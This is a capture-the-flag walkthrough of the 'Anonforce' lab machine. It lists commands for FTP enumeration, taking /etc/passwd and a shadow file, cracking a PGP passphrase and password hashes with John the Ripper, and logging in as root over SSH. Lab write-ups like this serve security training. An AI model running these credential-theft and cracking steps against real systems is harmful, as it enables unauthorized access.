# Anonforce Walkthrough

## Tools Used
- Nmap  
- FTP  
- GPG  
- John the Ripper  
- Unshadow  
- SSH  

## Step 1: Enumeration
- Added target machine IP to /etc/hosts for convenience.
- Used hostname instead of IP throughout the room.
- Scan:
  - nmap -sV -Pn anonforce
- Found two services:
  - FTP
  - SSH
- Service versions were not useful.

## Step 2: Anonymous FTP Access
- Login:
  - ftp anonforce
- Anonymous login succeeded.
- FTP session provided access to the filesystem.
- Found user directory:
  - /home/melodias
- Located user.txt.
- Downloaded with:
  - get user.txt
- Retrieved the first flag.

## Step 3: Finding PGP Files
- Returned to /.
- Found directory:
  - notread
- Files present:
  - backup.pgp
  - private.asc
- Downloaded both files using:
  - get backup.pgp
  - get private.asc

## Step 4: Analyzing the Files
- Checked available tools:
  - apropos pgp
- Found GPG utilities installed.
- File analysis:
  - file private.asc → PGP private key block
  - gpg private.asc → Key protected with a passphrase
  - file backup.pgp → Encrypted data

## Step 5: Cracking the Private Key Passphrase
- Extracted hash:
  - gpg2john private.asc > private.txt
- Cracked with John:
  - john private.txt
- Recovered the passphrase.

## Step 6: Importing the Key and Decrypting Data
- Import private key:
  - gpg --import private.asc
- Enter the recovered passphrase when prompted.
- Verify imported keys:
  - gpg --list-keys
- Decrypt backup:
  - gpg -d backup.pgp
- Decrypted contents revealed a shadow file from the target system.

## Step 7: Obtaining the Password File
- Reconnect to FTP as anonymous.
- Download:
  - /etc/passwd
- Note:
  - Downloading directly to /etc/passwd on the attacker machine can overwrite or append data unexpectedly.

## Step 8: Combining passwd and shadow
- Locating suitable tool:
  - apropos -a shadow passwd
- Use unshadow:
  - unshadow /etc/passwd shadow.txt > pass.txt

## Step 9: Cracking Credentials
- Crack hashes:
  - john pass.txt
- Or:
  - john --wordlist=/usr/share/wordlists/rockyou.txt pass.txt
- If output is not displayed:
  - john --show pass.txt
- Recovered the root password.

## Step 10: Root Access
- Login through SSH:
  - ssh root@anonforce
- Enter the recovered password.
- Access the root account and retrieve the final flag.

## Summary
- Discovered anonymous FTP access.
- Retrieved user.txt from melodias' home directory.
- Downloaded encrypted PGP files.
- Cracked a PGP private key passphrase.
- Decrypted a backup containing a shadow file.
- Combined passwd and shadow using unshadow.
- Cracked the root password with John.
- Logged in as root via SSH and obtained the final flag.
